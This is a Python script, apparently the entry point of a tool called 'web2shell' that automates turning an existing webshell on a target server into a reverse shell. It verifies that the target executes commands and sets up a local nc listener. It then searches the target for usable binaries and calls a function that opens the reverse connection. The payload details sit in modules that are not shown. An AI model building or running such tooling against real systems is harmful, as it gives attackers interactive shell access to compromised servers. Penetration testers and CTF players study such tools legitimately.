import argparse
import subprocess

import psutil

from modules import commands, connection, flags, local, logger

parser = argparse.ArgumentParser(
    prog="web2shell",
    description="Automate converting webshells into reverse shells.",
)
parser = flags.setup(parser)
results = parser.parse_args()
logger.splash()
if not results.force:
    logger.log("Verifying commands can be executed...")
    if not commands.verify(results.url, results.verbose):
        logger.log(
            "System does not seem to be accepting commands. You can ignore this with --force",
        )
        quit()
if results.ip is None and results.port is None:
    ip = connection.get_ip(psutil.net_if_addrs(), results.interface)
    port = connection.get_port(ip)
    if port < 1:
        logger.log("No ports available.")
        quit()
    if results.nc is not None:
        nc = results.nc
    else:
        logger.log("Finding local nc binary...")
        nc = local.find_nc()
    if nc is None:
        logger.log("nc not found. Please specify the path to it with --nc /path/to/bin")
        quit()
    logger.log(f"nc target at {nc}")
    p = subprocess.Popen(f"{nc} -nlvp {port}".split(" "), start_new_session=True)
else:
    ip = results.ip
    port = results.port
logger.log(f"Final connection string will be {ip}:{port}...")
logger.log("Finding bins...")
bins = commands.find_bins(results.url, results.verbose)
if len(bins) < 1:
    logger.log("No valid bins found.")
    quit()
logger.log("Executing reverse shell...")
commands.reverse_connection(bins, results.url, ip, port, results.verbose)
